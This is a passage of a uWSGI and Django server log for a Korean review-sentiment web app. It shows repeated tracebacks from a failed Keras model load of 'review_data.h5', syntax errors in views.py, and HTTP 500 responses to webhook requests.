    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 11, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #정확도가 가장 높았을 때 저장된 모델을 로드
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Thu Aug 27 04:40:47 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /webhook/ (ip 66.102.6.205) !!!
Thu Aug 27 04:40:47 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during POST /webhook/ (66.102.6.205)
OSError: write error
[pid: 3805|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 540 bytes} [Thu Aug 27 04:40:11 2020] POST /webhook/ => generated 32611 bytes in 36235 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-27 04:55:39.018439: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-27 04:55:39.019869: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-27 04:55:39.021232: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 11, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #정확도가 가장 높았을 때 저장된 모델을 로드
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Thu Aug 27 04:55:42 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /webhook/ (ip 66.102.6.205) !!!
Thu Aug 27 04:55:42 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during POST /webhook/ (66.102.6.205)
OSError: write error
[pid: 3805|app: 0|req: 2/2] 66.102.6.205 () {42 vars in 540 bytes} [Thu Aug 27 04:55:18 2020] POST /webhook/ => generated 32611 bytes in 24024 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 05:03:02 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x560ee628bd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x560ee628bd00 pid: 4042 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4042, cores: 1)
2020-08-27 05:03:09.868016: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-27 05:03:09.868062: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
2020-08-27 05:03:12.015760: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-27 05:03:12.015792: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-27 05:03:12.015807: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-27 05:03:12.016037: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-27 05:03:12.041440: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199915000 Hz
2020-08-27 05:03:12.041832: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x560ee9a4a8f0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-27 05:03:12.041851: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-27 05:03:12.325926: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-27 05:03:12.327349: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-27 05:03:12.328730: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 11, in <module>
    from . import naverNlpsave
  File "./haniumapp/naverNlpsave.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #정확도가 가장 높았을 때 저장된 모델을 로드
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
[pid: 4042|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Thu Aug 27 05:03:09 2020] POST /webhook/ => generated 140287 bytes in 3034 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 12
    from . import review_data.h5
                             ^
SyntaxError: invalid syntax
[pid: 4042|app: 0|req: 2/2] 184.105.247.196 () {30 vars in 321 bytes} [Thu Aug 27 05:26:44 2020] GET / => generated 100876 bytes in 62 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 05:57:41 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5569255a8d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5569255a8d00 pid: 4119 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4119, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 12
    from . import review_data.h5
                             ^
SyntaxError: invalid syntax
[pid: 4119|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Thu Aug 27 05:57:47 2020] POST /webhook/ => generated 101872 bytes in 69 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:06:48 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5628f85ddd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5628f85ddd00 pid: 4260 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4260, cores: 1)
2020-08-27 06:06:59.355136: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-27 06:06:59.355169: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
2020-08-27 06:07:01.485723: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-27 06:07:01.485754: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-27 06:07:01.485769: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-27 06:07:01.485995: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-27 06:07:01.509734: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199915000 Hz
2020-08-27 06:07:01.510124: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5628fbdce0b0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-27 06:07:01.510140: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-27 06:07:01.793312: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-27 06:07:01.794725: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-27 06:07:01.796099: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 118, in <module>
    loaded_model = load_model('review_data.h5') #정확도가 가장 높았을 때 저장된 모델을 로드
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
[pid: 4260|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Thu Aug 27 06:06:58 2020] POST /webhook/ => generated 129570 bytes in 3008 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:12:34 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x555dedb8dd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x555dedb8dd00 pid: 4308 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4308, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 121
    def predict_pos_text(text):
      ^
SyntaxError: invalid syntax
[pid: 4308|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 540 bytes} [Thu Aug 27 06:12:51 2020] POST /webhook/ => generated 101874 bytes in 69 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:15:29 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55e297796d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55e297796d00 pid: 4318 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4318, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
